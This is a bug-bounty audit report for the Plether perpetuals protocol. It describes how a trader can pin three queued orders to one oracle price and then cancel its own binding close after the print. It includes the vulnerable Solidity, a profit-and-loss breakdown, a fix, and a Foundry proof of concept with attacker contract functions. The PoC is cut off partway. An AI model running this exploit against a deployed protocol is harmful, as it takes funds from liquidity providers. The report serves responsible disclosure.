# \#99280 [SC-Critical] Close admission in OrderLiquidationBatchLogic counts the account's pending increases, so an owner can cancel its own committed close after the pinned price prints, leading to direct theft of user funds from LPs

**Submitted on Nov 12th 2026 at 21:15:44 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99280
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A committed close is binding and fills at the first Pyth price after its commit. Close admission sizes the close against the live position plus the account's own pending same-side increases. Execution re-plans the close against the live position only, and a close bigger than that fails for good, at no cost. So a trader commits a small partial close, a tiny increase and a close of the whole position, all pinned to one price. The whole close now fills only if the tiny increase fills, and the trader decides that after the price prints: one withdrawal of free settlement leaves the increase unable to pay its fee. I ran it in the repo's Foundry suite with the production config and the real signed Pyth prices of the 6 November 2026 US payrolls release. The trader arms the close of a 25.34M USDG LONG at 13:29:59. At 13:30:02 it reads the release in public Binance trades, cancels the close for 0.11 USDG, keeps the LONG through the move, and withdraws 10,709.71 USDG more than it put in. The victim Junior LP ends 33,075.93 USDG below the same orders with the close binding. On the same release the same rule keeps the close for a SHORT holder, so the trader gets the better of holding and closing on either side.

## Vulnerability Details

1. The trader holds a LONG of 263,124 lots (25.34M USDG). At 13:29:59 one transaction commits C0 (close 24 lots), I0 (increase 11 lots, `marginDelta` 0) and C1 (close 263,111 lots, which is live - c0 + i0). All three pin to the first Pyth publication after the commit, 13:30:00 (`PletherOracle.sol:610-614`). `Router.executeOrder` has no caller restriction (`OrderRouter.sol:240-243`).
2. Close admission checks the close against `_queuedPosition` (`OrderLiquidationBatchLogic.sol:344-353`). That projection adds every pending same-side increase to the live size (`OrderLiquidationBatchLogic.sol:392-398`). So C1 is admitted at 263,124 - 24 + 11 = 263,111 lots. The same C1 without I0 reverts `OrderRouter__SizeExceedsQueued`. A close carries no bounty (`OrderLiquidationBatchLogic.sol:235-240`).
3. A close larger than the live size reverts at commit (`CloseCommitmentLib.sol:23-25`). That is why C0 comes first: it keeps C1 at or below the live size at commit, while C1 exceeds live - c0 once C0 fills.
4. At execution C1 is re-planned against the live position. If I0 did not fill, the live size is 263,100 and C1 fails `CLOSE_SIZE_EXCEEDS` (`CfdEnginePlanLib.sol:825-828`). Close failures are classed user-invalid (`CfdEnginePlanLib.sol:135-143`) and recorded as terminal `PlannerRejected` (`OrderRouterExecutionSidecar.sol:846-853`). The LONG stays open.
5. The owner controls I0 after the pin. With `marginDelta` 0, I0 pays its trade cost from free settlement (`MarginClearinghouseAccountingLib.sol:157-161`), or fails `MARGIN_DRAINED_BY_FEES` (`CfdEnginePlanLib.sol:357-364`). That code is an execution-time code (`CfdEnginePlanLib.sol:100-102`), so the commit screen admits I0 (`OrderLiquidationBatchLogic.sol:437-445`). C0's fill puts 18.67 USDG back in free settlement, more than I0's 4.36 USDG cost. One `withdrawMargin` (`MarginClearinghouse.sol:414-419`) right after C0 fills takes it out. The withdrawal guard checks only the position's health and a fresh mark (`CfdEngineSettlementSidecar.sol:255-284`).
6. I0 adds no new pledge, so it can fill only if C0's trimmed liquidation reserve covers I0's reserve (`CfdEnginePlanLib.sol:551-577`). At the pin's real basket confidence (8,058, 0.8366 bp) that needs at least 263,029 lots after C0. I measured the threshold by execution.
7. The guarantee this breaks: "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options" (`SECURITY.md:658-659`), and "Users cannot cancel queued orders once committed" (`SECURITY.md:366`). The guard that should stop it is close admission sizing a close against the live position less earlier pending closes. It counts pending increases instead, and nothing at execution ties the close back to the increase it was admitted on.

### Vulnerable source code

**1. close admission projects the position through the account's queued orders** @ packages/perps/src/router/OrderLiquidationBatchLogic.sol:344-353

```solidity
    function _validateCloseAdmission(
        IOrderLiquidationBatchHost host,
        address account,
        CfdTypes.Side side,
        uint256 sizeDelta
    ) private view {
        ICfdEngineCore engine = host.engine();
        QueuedPositionView memory queuedPosition = _queuedPosition(host, engine, account);
        OrderValidationLib.validateCloseCommit(
            queuedPosition.exists, queuedPosition.size, queuedPosition.side, side, sizeDelta
```

**2. the projection adds pending same-side increases** @ packages/perps/src/router/OrderLiquidationBatchLogic.sol:392-398

```solidity
                } else if (!queuedPosition.exists) {
                    queuedPosition.exists = true;
                    queuedPosition.side = pending.side;
                    queuedPosition.size = pending.sizeDelta;
                } else if (pending.side == queuedPosition.side) {
                    queuedPosition.size += pending.sizeDelta;
                }
```

**3. execution re-plans the close against the live position** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:825-828

```solidity
        if (pos.size < order.sizeDelta) {
            delta.revertCode = CfdEnginePlanTypes.CloseRevertCode.CLOSE_SIZE_EXCEEDS;
            return delta;
        }
```

**4. the failure is terminal** @ packages/perps/src/OrderRouterExecutionSidecar.sol:846-853

```solidity
            if (
                knownCode && category == uint256(expectedCategory)
                    && expectedCategory != CfdEnginePlanTypes.ExecutionFailurePolicyCategory.None
            ) {
                classification.terminal = true;
                classification.plannerFailure = true;
                classification.plannerIsClose = isClose == 1;
                classification.reason = OrderV3Types.TerminalReason.PlannerRejected;
```

**5. the increase pays its trade cost from free settlement** @ packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol:157-161

```solidity
        if (tradeCostAssets > 0) {
            plan.settlementDebitAssets = uint256(tradeCostAssets);
            if (plan.settlementDebitAssets > freeSettlementAssets) {
                plan.insufficientFreeEquity = true;
                return plan;
```

**6. or fails with an execution-time code** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:357-364

```solidity
            MarginClearinghouseAccountingLib.OpenCostPlan memory openCostPlan =
                MarginClearinghouseAccountingLib.planOpenCostApplication(
                    openCostBuckets, delta.marginDeltaAssets, delta.tradeCostAssets
                );
            if (openCostPlan.insufficientFreeEquity) {
                delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.MARGIN_DRAINED_BY_FEES;
                return delta;
            }
```

**7. the fill is pinned to the first update after the commit** @ packages/perps/src/PletherOracle.sol:610-614

```solidity
        uint64 minPublishTime = request.commitTime + 1;
        uint256 settlementDeadline = uint256(request.commitTime) + orderSettlementWindow;
        uint64 maxPublishTime = uint64(settlementDeadline < block.timestamp ? settlementDeadline : block.timestamp);
        try pyth.parsePriceFeedUpdatesUnique{value: pythFee}(
            pythUpdateData, pythFeedIds, minPublishTime, maxPublishTime
```

## Impact Details

- Impact row: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" (Critical). The attacker mints 300,000.000000 USDG and ends with 310,709.710983 USDG in its own wallet after it withdraws everything, +10,709.710983 USDG. The victim LP_J's Junior is worth 10,007,357.092660 USDG, against 10,040,433.025872 USDG with the same orders and the close binding (-33,075.933212) and 10,037,946.036337 USDG with no attacker (-30,588.943677). Senior is unchanged. The attacker's +33,085.163350 against the binding run equals the pool's -33,075.935811 plus the treasury's -9.227539, to the atom.
- The rule pays on either side of the release. In the companion test (gist) the lever on I0 is its own `maxPostLeverageBps` bound, which works for a LONG or a SHORT, and the same 25.34M position runs as a LONG and as a SHORT on the same window. The trader follows one rule read from the public print: keep the position if the print favours it, otherwise keep the close. The LONG gets the holder's result (+10,709.71 against the honest closer's -22,366.15). The SHORT gets the closer's result (-19,782.93 against the honest holder's -52,807.10). Across both sides the rule beats always-hold by 33,012.70 USDG and always-close by 33,066.72 USDG, and LP_J ends 33,038.71 and 33,068.25 USDG worse.
- Everything is production state. Every router, oracle, engine, pool and tranche parameter is the value read by `eth_call` from the deployed v2.0.0 at block 326633764, and `setUp` asserts each one. The five ticks are the real keeper ticks of 13:28:22 to 13:30:35, decoded from the signed Pyth payloads in their calldata. After every tick the test asserts the engine mark equals the deployed engine's real `lastMarkPrice`.
- The decision uses public data that had printed by then. Binance EUR/USDT, from the public daily trade file on data.binance.vision (sha256 equal to its published checksum), was 8.05 bp below its last pre-release trade by 13:30:02.300, over 55 trades. A falling EUR/USD means a falling USD-quoted basket, and a LONG gains.
- The cancel lands at commit + 3 s. On 6 November the deployment's executor finalized 42 orders 3 to 9 s after commit, 40 of them at 4 s or later. When the executor is first, the trader gets the binding close and loses nothing extra. The program: "Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it."
- Prerequisites, all permissionless: a LONG of at least 263,029 lots after C0 at this pin's confidence (25.34M USDG, 250,000 USDG of margin), a contract account that bundles `executeOrder` and `withdrawMargin`, and a scheduled release. The pool is 10M Junior and 25M Senior, inside the release caps, with an unrelated 12.6M SHORT on the book. The cancel costs I0's bounty, 0.105944 USDG.
- The victim sees ordinary orders: C0 fills, I0 and C1 end as `PlannerRejected` like any order that fails at execution, and the LONG closes later at a public price. Every LP pays pro rata through the pool's trading P&L.
- It repeats at every scheduled release. The orders are three commits, and an account holds up to 5 pending orders.
- Dedup note.
  - #97733 (withdraw cancels a rebate-reserve open), #98732 and my report "Missing pending-order check in CfdEngine.addMargin lets a trader rescue an increase that fails its initial-margin check at its pinned price" (`addMargin` revives an open), and #97858 (LP-epoch settlement voids an open) each make an open fail or fill. Here the order cancelled is a close of the whole position, and close admission ties its fate to a separate 11-lot order.
  - The lever on that 11-lot order is interchangeable, so a fix to any one lever leaves this open. The companion test applies the strictest form of the withdrawal fix (no withdrawal while the account has a pending open, `sibling-fix.patch` in the gist). The withdrawal cancel then reverts `CfdEngine__WithdrawBlockedByOpenPosition`. On the same patched build, the same close dies through I0's own `maxPostLeverageBps` bound, with an `addMargin` to keep it. The attacker still ends +10,709.710975 USDG, and LP_J ends -33,075.847460 USDG against the run where the close binds. Only a change to close admission closes both.
  - HIGH-1 (`SECURITY.md:701-713`) is a commit after an already published price. Here the commit is at 13:29:59, before the 13:30:00 publication it pins to. The program's carve-out for a HIGH-1 report reads: "valid only with a proof of concept showing a repeatable, net-profitable extraction from LPs".
  - `ACCOUNTING_SPEC.md:1096-1098` documents the projection for an open behind a queued close, and an execution recheck when that close fails. Nothing documents a close admitted against a pending increase.
  - Fix: admit a close only against the live size minus earlier pending closes, and ignore pending increases.

## References

Close admission
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:235-240 - a close takes no bounty
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:344-353 - `_validateCloseAdmission` on the queued projection
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:367-402 - `_queuedPosition`
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:392-398 - pending same-side increases added
- packages/perps/src/libraries/CloseCommitmentLib.sol:23-25 - a close larger than the live size reverts at commit

Execution and the terminal failure
- packages/perps/src/libraries/CfdEnginePlanLib.sol:825-828 - `CLOSE_SIZE_EXCEEDS`
- packages/perps/src/libraries/CfdEnginePlanLib.sol:135-143 - close failures are user-invalid
- packages/perps/src/OrderRouterExecutionSidecar.sol:846-853 - recorded as terminal `PlannerRejected`

The lever on I0
- packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol:157-161 - trade cost paid from free settlement
- packages/perps/src/libraries/CfdEnginePlanLib.sol:357-364 - `MARGIN_DRAINED_BY_FEES`
- packages/perps/src/libraries/CfdEnginePlanLib.sol:100-102 - an execution-time code
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:437-445 - the commit screen rejects only commit-time codes
- packages/perps/src/libraries/CfdEnginePlanLib.sol:551-577 - a reserve increase needs new pledge
- packages/perps/src/MarginClearinghouse.sol:414-419 - `withdrawMargin`
- packages/perps/src/CfdEngineSettlementSidecar.sol:255-284 - the withdrawal guard

Pinned fill
- packages/perps/src/PletherOracle.sol:610-614 - first unique update after the commit
- packages/perps/src/OrderRouter.sol:240-243 - `executeOrder`, no caller restriction

Guarantee and known issues
- packages/perps/SECURITY.md:658-659 - no free options from queued intents
- packages/perps/SECURITY.md:366 - users cannot cancel queued orders
- packages/perps/SECURITY.md:701-713 - HIGH-1
- packages/perps/ACCOUNTING_SPEC.md:1096-1098 - the documented projection



## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/34bf22ba320a612c004fdd97617f019e

## Proof of Concept

## Proof of Concept

One Foundry test file in the repo's own suite at a82d4fef, on the repo's `BasePerpTest`, with only USDG and Pyth mocked. It replays the real keeper ticks of the 6 November 2026 payrolls release and runs four worlds from one state: the attack, the same orders with the close binding, the executor first, and no attacker. Files: https://gist.github.com/decies-centena-millia/34bf22ba320a612c004fdd97617f019e

```bash
mkdir -p packages/perps/test/poc && cp CloseAdmissionPendingIncreasePoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/CloseAdmissionPendingIncreasePoC.t.sol --skip 'test/perps/**' --skip 'test/fixtures/**' --skip 'script/**' -vv
```

### attack step-by-step

1. 11:50 to 13:00 UTC. LP_J deposits 10,000,000 USDG of Junior and LP_S 25,000,000 USDG of Senior through the public deposit queue. At 13:28:54 an unrelated trader opens a 131,000-lot SHORT (12.6M USDG), filled on the 13:28:55 real tick.
2. 13:29:27. ATTACKER funds its account with 300,000 USDG and commits a 263,124-lot LONG with 250,000 USDG of margin. It fills at 96,312,388 on the 13:29:28 real tick.
3. 13:29:59. `arm` withdraws free settlement down to I0's bounty and commits C0 (close 24 lots), I0 (open 11 lots, `marginDelta` 0) and C1 (close 263,111 lots). All three pin to the 13:30:00 publication.
4. 13:30:00. Payrolls print. By 13:30:02.300 Binance EUR/USDT is 8.05 bp below its last pre-release trade.
5. 13:30:02. `kill` executes C0 at the pin (96,320,333) and withdraws the 18.672578 USDG that C0 freed. At 13:30:05 the executor runs I0, which fails `MARGIN_DRAINED_BY_FEES`, and C1, which fails `CLOSE_SIZE_EXCEEDS`. 263,100 lots stay open.
6. 13:30:34. ATTACKER commits a full close, filled at 96,194,628 on the 13:30:35 real tick. At 13:30:38 it withdraws everything to its wallet.

## main Attack code

```solidity
// 13:29:59, one transaction: keep only I0's bounty free, then commit C0, I0, C1 (same commit second, same pinned price)
function arm(uint256 keepFree, OrderV3Types.OrderRequest calldata c0, OrderV3Types.OrderRequest calldata i0,
    OrderV3Types.OrderRequest calldata c1) external onlyOwner returns (uint64 idC0, uint64 idI0, uint64 idC1) {
    uint256 free = clearinghouse.getFreeBuyingPowerAssets(address(this));
    if (free > keepFree) clearinghouse.withdrawMargin(free - keepFree);
    idC0 = router.commitOrder(c0);
    idI0 = router.commitOrder(i0);
    idC1 = router.commitOrder(c1);
}

// 13:30:02, after the print: fill C0 at the pin, then take back the free settlement I0 needs for its fee
function kill(uint64 idC0, bytes[] calldata pinned) external onlyOwner returns (OrderV3Types.ExecutionResult memory r, uint256 withdrawn) {
    r = router.executeOrder(idC0, pinned);
    withdrawn = clearinghouse.getFreeBuyingPowerAssets(address(this));
    if (withdrawn != 0) clearinghouse.withdrawMargin(withdrawn);
}
```

```
plant : C0 (close 24), I0 (open 11, marginDelta 0) and C1 (close live - 24 + 11) committed in one transaction before the release
fire  : Router.executeOrder(C0) and MarginClearinghouse.withdrawMargin in one transaction, after a favourable print
```

### full poc code, single file, single runnable command

Foundry: forge 1.8.5 (`51a52c59`), solc 0.8.35, the repo's default `packages/perps/foundry.toml` profile (`via_ir = true`, optimizer 200 runs). The libraries are at the submodule commits `a82d4fef` pins (forge-std `f5495c9b`, morpho-blue `55d2d993`, openzeppelin-contracts `fcbae539`). No RPC is needed.

`CloseAdmissionPendingIncreasePoC.t.sol`, placed at `packages/perps/test/poc/CloseAdmissionPendingIncreasePoC.t.sol`. It extends the repo's `test/perps/BasePerpTest.sol`. Command, from the repo root at a82d4fef:

```bash
mkdir -p packages/perps/test/poc && cp CloseAdmissionPendingIncreasePoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/CloseAdmissionPendingIncreasePoC.t.sol --skip 'test/perps/**' --skip 'test/fixtures/**' --skip 'script/**' -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PoC: a queued close is admitted against the account's own pending increase, so the owner decides after the
// pinned price prints whether its 25.3M close fills. Real 6 Nov 2026 payrolls ticks, production config.

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

abstract contract CloseAdmissionNfpData {
    struct RealTick {
        bytes32 txHash;
        uint256 blockNumber;
        uint256 blockTimestamp;
        uint256 publishTime;
        uint256 prevPublishTime;
        uint256 realMark;
        uint256 basketConf;
        uint256 feedA;
        uint256 feedB;
        uint64 confA;
        uint64 confB;
    }

    struct Trade {
        uint64 aggTradeId;
        uint32 priceE4;
        uint64 qtyE1;
        uint64 timeUs;
        bool isBuyerMaker;
    }

    uint256 internal constant REAL_TICKS = 5;
    uint256 internal constant BINANCE_ROWS = 57;

    function _realTicks() internal pure returns (RealTick[] memory t) {
        t = new RealTick[](5);
        t[0] = RealTick(0x944aec2129d14e41236b2ec425194c3179189469af6c109aba71435b92c73693, 326633568, 1793971705, 1793971702, 1793971701, 96313700, 3193, 96313700, 96313700, 3193, 3194);
        t[1] = RealTick(0xd71a9f0e3f2514581c47b4c27e55250b6c96302ce68eebb01db2a844202c3ac3, 326633692, 1793971739, 1793971735, 1793971734, 96308923, 2883, 96308924, 96308922, 2883, 2884);
        t[2] = RealTick(0xfdc294390dd2a6a8e6c476b60a294a3b44056807a6f498e9e6baeb5214be3d32, 326633813, 1793971773, 1793971768, 1793971767, 96313393, 4020, 96313394, 96313392, 4020, 4020);
        t[3] = RealTick(0x989b88cdaf4ccdccd8203c6a7f2f7b6739c1484ea3e64a81ecdccb5c2136938e, 326633933, 1793971805, 1793971800, 1793971799, 96318319, 8058, 96318320, 96318318, 8058, 8058);
        t[4] = RealTick(0xfc1dc075d626b164b44ce4024e2d4a35faeecfbc8f549955115eb721f06f361f, 326634054, 1793971838, 1793971835, 1793971834, 96192674, 7818, 96192674, 96192674, 7818, 7818);
    }

    function _binanceEurUsdt() internal pure returns (Trade[] memory t) {
        t = new Trade[](57);
        t[0] = Trade(140905652, 11177, 2915, 1793971799039409, false);
        t[1] = Trade(140905653, 11177, 211, 1793971799943376, false);
        t[2] = Trade(140905654, 11176, 1099, 1793971800776620, false);
        t[3] = Trade(140905655, 11176, 6652, 1793971801089782, false);
        t[4] = Trade(140905656, 11175, 27239, 1793971801135067, true);
        t[5] = Trade(140905657, 11175, 213, 1793971801141387, true);
        t[6] = Trade(140905658, 11176, 1099, 1793971801142542, false);
        t[7] = Trade(140905659, 11177, 2527, 1793971801142542, false);
        t[8] = Trade(140905660, 11177, 4518, 1793971801143709, false);
        t[9] = Trade(140905661, 11178, 1443, 1793971801143709, false);
        t[10] = Trade(140905662, 11175, 105000, 1793971801147528, true);
        t[11] = Trade(140905663, 11178, 5523, 1793971801149219, false);
        t[12] = Trade(140905664, 11176, 435, 1793971801169867, false);
        t[13] = Trade(140905665, 11176, 1951, 1793971801171859, false);
        t[14] = Trade(140905666, 11178, 3905, 1793971801171859, false);
        t[15] = Trade(140905667, 11175, 6811, 1793971801184227, true);
        t[16] = Trade(140905668, 11174, 63838, 1793971801184227, true);
        t[17] = Trade(140905669, 11173, 6595, 1793971801184227, true);
        t[18] = Trade(140905670, 11178, 5991, 1793971801200978, false);
        t[19] = Trade(140905671, 11178, 3325, 1793971801255789, false);
        t[20] = Trade(140905672, 11174, 44747, 1793971801283667, true);
        t[21] = Trade(140905673, 11173, 89502, 1793971801283667, true);
        t[22] = Trade(140905674, 11172, 24779, 1793971801283667, true);
        t[23] = Trade(140905675, 11171, 15550, 1793971801283667, true);
        t[24] = Trade(140905676, 11174, 2744, 1793971801473946, true);
        t[25] = Trade(140905677, 11174, 894, 1793971801541179, true);
        t[26] = Trade(140905678, 11174, 5166, 1793971801576039, true);
        t[27] = Trade(140905679, 11174, 108, 1793971801582623, true);
        t[28] = Trade(140905680, 11174, 12330, 1793971801594414, true);
        t[29] = Trade(140905681, 11174, 74, 1793971801674612, true);
        t[30] = Trade(140905682, 11174, 280, 1793971801685539, true);
        t[31] = Trade(140905683, 11174, 27116, 1793971801726301, true);
        t[32] = Trade(140905684, 11178, 5900, 1793971801747272, false);
        t[33] = Trade(140905685, 11179, 6200, 1793971801747272, false);
        t[34] = Trade(140905686, 11180, 5059, 1793971801747272, false);
        t[35] = Trade(140905687, 11180, 4025, 1793971801753336, false);
        t[36] = Trade(140905688, 11181, 56, 1793971801782702, false);
        t[37] = Trade(140905689, 11174, 27119, 1793971801788065, true);
        t[38] = Trade(140905690, 11174, 883, 1793971801821523, true);
        t[39] = Trade(140905691, 11174, 421, 1793971801873819, true);
        t[40] = Trade(140905692, 11174, 57106, 1793971802003822, true);
        t[41] = Trade(140905693, 11173, 15737, 1793971802003822, true);
        t[42] = Trade(140905694, 11172, 2292, 1793971802003822, true);
        t[43] = Trade(140905695, 11171, 116226, 1793971802003822, true);
        t[44] = Trade(140905696, 11170, 61052, 1793971802003822, true);
        t[45] = Trade(140905697, 11169, 9271, 1793971802003822, true);
        t[46] = Trade(140905698, 11178, 10840, 1793971802062709, false);
        t[47] = Trade(140905699, 11172, 1342, 1793971802075138, true);
        t[48] = Trade(140905700, 11174, 8940, 1793971802085748, true);
        t[49] = Trade(140905701, 11172, 7511, 1793971802098225, true);
        t[50] = Trade(140905702, 11172, 1342, 1793971802104317, true);
        t[51] = Trade(140905703, 11170, 44763, 1793971802106342, true);
        t[52] = Trade(140905704, 11169, 10671, 1793971802106342, true);
        t[53] = Trade(140905705, 11172, 1342, 1793971802135472, true);
        t[54] = Trade(140905706, 11172, 269, 1793971802173413, true);
        t[55] = Trade(140905707, 11170, 6200, 1793971802212093, true);
        t[56] = Trade(140905708, 11168, 1051, 1793971802279323, true);
    }
}

interface IAcctRouter {
    function commitOrder(
        OrderV3Types.OrderRequest calldata request
    ) external returns (uint64 orderId);

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);
}

interface IAcctClearinghouse {
    function depositMargin(
        uint256 amount
    ) external;

    function withdrawMargin(
        uint256 amount
    ) external;

    function balanceAssets(
        address account
    ) external view returns (uint256);

    function getFreeBuyingPowerAssets(
        address account
    ) external view returns (uint256);
}

contract TraderAccount {
    address internal immutable owner;
    IAcctRouter internal immutable router;
    IAcctClearinghouse internal immutable clearinghouse;
    IERC20 internal immutable usdg;

    constructor(
        address router_,
        address clearinghouse_,
        address usdg_
    ) {
        owner = msg.sender;
        router = IAcctRouter(router_);
        clearinghouse = IAcctClearinghouse(clearinghouse_);
        usdg = IERC20(usdg_);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    function fund(
        uint256 amount
    ) external onlyOwner {
        usdg.transferFrom(owner, address(this), amount);
        usdg.approve(address(clearinghouse), amount);
        clearinghouse.depositMargin(amount);
    }

    function commit(
        OrderV3Types.OrderRequest calldata request
    ) external onlyOwner returns (uint64 orderId) {
        orderId = router.commitOrder(request);
    }

    function arm(
        uint256 keepFree,
        OrderV3Types.OrderRequest calldata c0,
        OrderV3Types.OrderRequest calldata i0,
        OrderV3Types.OrderRequest calldata c1
    ) external onlyOwner returns (uint64 idC0, uint64 idI0, uint64 idC1) {
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(address(this));
        if (free > keepFree) {
            clearinghouse.withdrawMargin(free - keepFree);
        }
        idC0 = router.commitOrder(c0);
        idI0 = router.commitOrder(i0);
        idC1 = router.commitOrder(c1);
    }

    function kill(
        uint64 idC0,
        bytes[] calldata pinned
    ) external onlyOwner returns (OrderV3Types.ExecutionResult memory r, uint256 withdrawn) {
        r = router.executeOrder(idC0, pinned);
        withdrawn = clearinghouse.getFreeBuyingPowerAssets(address(this));
        if (withdrawn != 0) {
            clearinghouse.withdrawMargin(withdrawn);
        }
    }

    function withdraw(
        uint256 amount
    ) external onlyOwner {
        clearinghouse.withdrawMargin(amount);
    }

    function withdrawAll() external onlyOwner {
        uint256 bal = clearinghouse.balanceAssets(address(this));
        if (bal != 0) {
            clearinghouse.withdrawMargin(bal);
        }
        uint256 w = usdg.balanceOf(address(this));
        if (w != 0) {
            usdg.transfer(owner, w);
        }
    }
}

contract CloseAdmissionPendingIncreasePoC is BasePerpTest, CloseAdmissionNfpData {
    uint256 internal constant P_MAX_EXECUTION_WINDOW = 60;
    uint256 internal constant P_MIN_OPEN_NOTIONAL = 1000e6;
    uint256 internal constant P_OPEN_BOUNTY_BPS = 1;
    uint256 internal constant P_MIN_OPEN_BOUNTY = 10_000;
    uint256 internal constant P_MAX_OPEN_BOUNTY = 200_000;
    uint256 internal constant P_PROTECTION_BOUNTY = 200_000;
    uint256 internal constant P_MAX_PENDING_ORDERS = 5;
    uint256 internal constant P_MIN_ENGINE_GAS = 600_000;
    uint256 internal constant P_MAX_PRUNE = 64;
    uint256 internal constant P_ORDER_STALENESS = 60;
    uint256 internal constant P_LIQ_STALENESS = 15;
    uint256 internal constant P_BASKET_MAX_CONF_BPS = 10;
    uint256 internal constant P_ORDER_SETTLEMENT_WINDOW = 15;
    uint256 internal constant P_MAX_PUBLISH_DIVERGENCE = 5;
    uint256 internal constant P_ADVERSE_MULTIPLIER_BPS = 2500;
    uint256 internal constant P_EXECUTION_FEE_BPS = 4;
    uint256 internal constant P_SETTLEMENT_BUFFER_BPS = 25;
    uint256 internal constant P_FROZEN_SPREAD_BPS = 50;
    uint256 internal constant P_FAD_RUNWAY = 3600;
    uint256 internal constant P_FAD_MAX_STALENESS = 259_200;
    uint256 internal constant P_ENGINE_MARK_STALENESS = 60;
    uint256 internal constant P_SENIOR_RATE_BPS = 800;
    uint256 internal constant P_POOL_MARK_STALENESS = 60;
    uint256 internal constant P_SENIOR_FROZEN_FEE_BPS = 25;
    uint256 internal constant P_JUNIOR_FROZEN_FEE_BPS = 75;
    uint256 internal constant P_MAX_SENIOR_EXPOSURE = 40_000_000e6;
    uint256 internal constant P_MAX_SENIOR_SHARE_BPS = 8000;

    address internal constant ATTACKER = address(0xA11CE);
    address internal constant OTHER = address(0x07E4);
    address internal constant KEEPER = address(0x1329);
    address internal constant EXECUTOR = address(0x5A71);
    address internal constant LP_J = address(0x1117);
    address internal constant LP_S = address(0x5E17);

    uint256 internal constant JUNIOR_ASSETS = 10_000_000e6;
    uint256 internal constant SENIOR_ASSETS = 25_000_000e6;
    uint256 internal constant OTHER_FUND = 200_000e6;
    uint256 internal constant OTHER_SHORT_LOTS = 131_000;
    uint256 internal constant OTHER_MARGIN = 150_000e6;

    uint256 internal constant ATTACKER_FUND = 300_000e6;
    uint256 internal constant BASE_MARGIN = 250_000e6;
    uint256 internal constant C0_LOTS = 24;
    uint256 internal constant I0_LOTS = 11;
    uint256 internal constant LIVE_AFTER_C0_LOTS = 263_100;
    uint256 internal constant BASE_LOTS = LIVE_AFTER_C0_LOTS + C0_LOTS;
    uint256 internal constant THRESHOLD_LIVE_AFTER_C0 = 263_029;

    uint256 internal constant T_FUND_REQ = 1_793_965_800;
    uint256 internal constant T_OTHER_COMMIT = 1_793_971_734;
    uint256 internal constant T_BASE_COMMIT = 1_793_971_767;
    uint256 internal constant T_ARM = 1_793_971_799;
    uint256 internal constant T_DECIDE = 1_793_971_802;
    uint256 internal constant T_EXECUTOR = 1_793_971_805;
    uint256 internal constant T_EXIT_COMMIT = 1_793_971_834;
    uint256 internal constant T_END = 1_793_971_838;
    uint256 internal constant RELEASE_US = 1_793_971_800_000_000;
    uint256 internal constant DECISION_US = 1_793_971_802_300_000;
    int256 internal constant SIGNAL_THRESHOLD_CBP = 500;

    uint256 internal constant PX_SHORT_OPEN_1328 = 96_309_643;
    uint256 internal constant PX_LONG_OPEN_1329 = 96_312_388;
    uint256 internal constant PX_LONG_OPEN_PIN = 96_316_305;
    uint256 internal constant PX_LONG_CLOSE_PIN = 96_320_333;
    uint256 internal constant PX_LONG_CLOSE_1330_35 = 96_194_628;

    enum World {
        Attack,
        Honest,
        ExecutorFirst,
        Baseline
    }

    struct Outcome {
        uint256 attackerWallet;
        uint256 victimJunior;
        uint256 senior;
        uint256 poolAssets;
        uint256 treasury;
        uint8 c0Reason;
        uint8 i0Reason;
        uint8 i0Code;
        uint8 c1Reason;
        uint8 c1Code;
        uint256 c1Price;
        uint256 exitPrice;
        uint256 liveAfterKill;
        uint256 i0Bounty;
        uint256 otherBalance;
    }

    TraderAccount internal acct;
    TraderAccount internal other;
    uint256 internal nonce;
    RealTick[] internal ticks;
    uint64 internal idC0;
    uint64 internal idI0;
    uint64 internal idC1;

    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

